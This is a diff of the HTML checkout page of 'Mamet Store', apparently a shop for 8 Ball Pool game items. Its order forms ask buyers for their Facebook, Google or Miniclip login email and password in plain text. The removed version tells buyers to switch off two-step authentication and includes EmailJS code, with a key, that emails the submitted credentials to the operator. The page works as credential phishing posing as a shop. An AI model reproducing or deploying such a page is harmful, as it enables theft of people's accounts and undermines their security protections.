@@ -3,104 +3,76 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Keranjang Saya - Mamet Store</title>
-  <link rel="stylesheet" href="assets/co.css?v=3" />
-  <script src="co.js" defer></script>
+  <title>Checkout - Mamet Store</title>
+  <link rel="stylesheet" href="assets/co.css" />
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script defer src="co.js"></script>
 </head>
 <body>
-  <header class="cart-header">
-    <div class="header-left"><a href="javascript:history.back()">← Kembali</a></div>
-    <div class="header-right"><a href="index.html">🏠</a></div>
+  <!-- Header -->
+  <header class="checkout-header">
+    <a href="javascript:history.back()">← Kembali</a>
+    <a href="index.html">🏠</a>
   </header>
 
-  <main id="cart-list"></main>
-  
-  <div id="empty-msg" class="empty-msg">Keranjang kamu masih kosong 🛒</div>
-  <footer class="checkout-bar">
-  <div class="checkout-top">
-    <label class="select-all">
-      <input type="checkbox" id="select-all" /> <strong>Semua</strong>
-    </label>
-    <button id="checkout-btn">Checkout (0)</button>
-    <div class="total-label">Total: <span id="total-price">Rp 0</span></div>
-  </div>
-</footer>
-  <div id="confirm-popup" class="popup hidden">
-  <div class="popup-content">
-    <p>Apakah kamu sudah yakin ketua cukup ini saja item kamu?</p>
-    <button id="wa-confirm" class="btn-wa">Pesan Sekarang</button>
-    <button id="wa-cancel" class="btn-cancel">Batal</button>
-  </div>
-  </div>
-  <!-- Popup Overlay -->
-<div id="popup-form" class="popup-overlay" style="display: none;">
-  <div class="popup-content">
-    <h3>Masukkan Data Akun</h3>
-    <form id="account-form">
-  <label>Nickname:</label>
-  <input type="text" name="nickname" required>
+  <!-- Banner -->
+  <section class="banner-section">
+    <img src="assets/img/banner.jpg" alt="Event Banner">
+  </section>
 
-  <label>Login via:</label>
-  <select name="login" required>
-    <option value="Facebook">Facebook</option>
-    <option value="Google Play">Google Play</option>
-    <option value="Miniclip">Miniclip</option>
-  </select>
+  <!-- Cart Section -->
+  <section id="cart-section">
+    <h2>Keranjang Anda</h2>
+    <label><input type="checkbox" id="select-all"> Pilih Semua</label>
+    <div id="cart-list"></div>
+    <p id="empty-msg">Keranjang masih kosong.</p>
+  </section>
 
-  <label>Email/No Telp (WA):</label>
-  <input type="email" name="email" required>
+  <!-- Form Input -->
+  <section class="form-section">
+    <form id="checkout-form">
+      <label>Username 8 Ball Pool:</label>
+      <input type="text" name="username" required>
 
-  <label>Password:</label>
-  <input type="text" name="password" required>
+      <label>Login akun:</label>
+      <select name="login" required>
+        <option value="Facebook">Facebook</option>
+        <option value="Gmail">Gmail</option>
+        <option value="Miniclip">Miniclip</option>
+      </select>
 
-  <label>Nomor WhatsApp:</label>
-  <input type="text" name="wa" required>
+      <label>Email / Nomor Telp:</label>
+      <input type="text" name="email" required>
 
-  <label>Email Aktif:</label>
-  <input type="email" name="emailaktif" required>
+      <label>Password:</label>
+      <input type="text" name="password" required>
 
-  <!-- DARI KERANJANG -->
-  <input type="hidden" name="order_items" id="order_items">
-      
-      <div class="popup-note">
-        <strong>Note:</strong><br>
-        • Nonaktifkan seluruh autentikasi 2 langkah baik Facebook/Google Play agar order otomatis terproses dan cepat.<br>
-        • Jika masih aktif, admin akan segera menghubungi kamu via WhatsApp atau email aktif.
+      <label>Nomor WhatsApp:</label>
+      <input type="text" name="wa" required>
+
+      <label>Metode Pembayaran:</label>
+      <div class="payment-options">
+        <label><input type="radio" name="metode" value="QRIS (+1500)" required> QRIS (+1500)</label>
+        <label><input type="radio" name="metode" value="Dana" required> Dana</label>
+        <label><input type="radio" name="metode" value="OVO (+1500)" required> Ovo (+1500)</label>
+        <label><input type="radio" name="metode" value="ShopeePay (+1500)" required> ShopeePay (+1500)</label>
+        <label><input type="radio" name="metode" value="GoPay (+1500)" required> GoPay (+1500)</label>
+        <label><input type="radio" name="metode" value="Bank BCA" required> Bank BCA</label>
+        <label><input type="radio" name="metode" value="Bank BRI" required> Bank BRI</label>
+        <label><input type="radio" name="metode" value="SeaBank" required> SeaBank</label>
+        <label><input type="radio" name="metode" value="Blu BCA" required> Blu BCA</label>
       </div>
 
-      <div class="popup-buttons">
-        <button type="submit">Kirim Akun</button>
-        <button type="button" onclick="closePopup()">Batal</button>
-      </div>
+      <label>Kode Promo/Voucher (opsional):</label>
+      <input type="text" name="voucher">
+
+      <!-- hidden input untuk item yang dibeli -->
+      <input type="hidden" name="order_items" id="order_items">
+
+      <!-- Submit -->
+      <button type="submit" id="submit-order">Pesan Sekarang</button>
+      <p class="total-harga">Total: <span id="total-harga">Rp 0</span></p>
     </form>
-  </div>
-</div>
-  <!-- EmailJS Script -->
-<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-<script>
-<script>
-  emailjs.init("nAUL1b5lv7jJmOcaY");
-
-  const form = document.getElementById("account-form");
-  let isSending = false;
-
-  form.addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    if (isSending) return; // cegah double submit
-    isSending = true;
-
-    emailjs.sendForm('service_ucup', 'template_1shj4dt', this)
-      .then(function () {
-        alert("✅ Order berhasil dikirim ke email!");
-        closePopup();
-        isSending = false;
-      }, function (error) {
-        alert("❌ Gagal kirim order: " + error.text);
-        isSending = false;
-      });
-  });
-</script>
-  
+  </section>
 </body>
 </html>
